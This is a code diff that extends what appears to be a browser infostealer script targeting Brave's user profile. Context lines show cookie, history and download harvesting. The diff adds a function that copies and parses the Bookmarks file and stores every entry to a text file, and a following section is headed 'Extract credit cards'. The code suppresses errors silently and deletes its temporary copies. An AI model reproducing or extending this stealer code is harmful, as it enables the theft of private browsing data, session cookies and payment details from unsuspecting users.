@@ -196,7 +196,7 @@ d_fetch_cookies(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Ne
 
 def fetch_history(dir):
     try:
-        file = os.path.join(os.environ["USERPROFILE"], dir)
+        file = os.path.join(os.environ["USERPROFILE"], dir) #r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History"
         shutil.copy(file, "history.db")
         
         conn = sqlite3.connect("history.db")
@@ -225,7 +225,7 @@ fetch_history(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Hist
 
 def fetch_downloads(dir):
     try:
-        file = os.path.join(os.environ["USERPROFILE"], dir)
+        file = os.path.join(os.environ["USERPROFILE"], dir) #r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History"
         shutil.copy(file, "history.db")
         
         conn = sqlite3.connect("history.db")
@@ -246,6 +246,52 @@ def fetch_downloads(dir):
         pass
     
 fetch_downloads(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History")
+
+##
+##Extract bookmarks
+##
+
+def fetch_bookmarks(dir):
+    try:
+        file = os.path.join(os.environ["USERPROFILE"], dir) #r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Bookmarks"
+        shutil.copy(file, "bookmarks.json")
+        with open("bookmarks.json", "r", encoding="utf-8") as f:
+            bookmarks_data = json.load(f)
+    except:
+        return
+
+    def extract_bookmarks(bookmarks_raw, folder=""):
+        bookmarks = []
+        try:
+            for item in bookmarks_raw["children"]:
+                if item["type"] == "folder":
+                    folder_bookmarks = extract_bookmarks(item, item["name"])
+                    bookmarks.extend(folder_bookmarks)
+                else:
+                    name = item["name"]
+                    url = item["url"]
+                    created = item["date_added"]
+                    last_used = item["date_last_used"]
+                    bookmarks.append({"name": name, "url": url, "created": created, "used": last_used, "folder": folder})
+            return bookmarks
+        except:
+            return bookmarks
+
+    try:
+        bookmarks = extract_bookmarks(bookmarks_data["roots"]["bookmark_bar"])
+        for bookmark in bookmarks:
+            name = bookmark["name"]
+            url = bookmark["url"]
+            created = bookmark["created"]
+            last_used = bookmark["used"]
+            folder = bookmark["folder"]
+            bookmark_ = f"\nName: {name}\nURL: {url}\nLast Used: {last_used}\nCreated: {created}\nFolder name: {folder}\n"
+            store_data("bookmarks.txt", bookmark_)
+        delete_file("bookmarks.json")
+    except:
+        pass
+        
+fetch_bookmarks(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Bookmarks")
 
 ##
 ##Extract credit cards
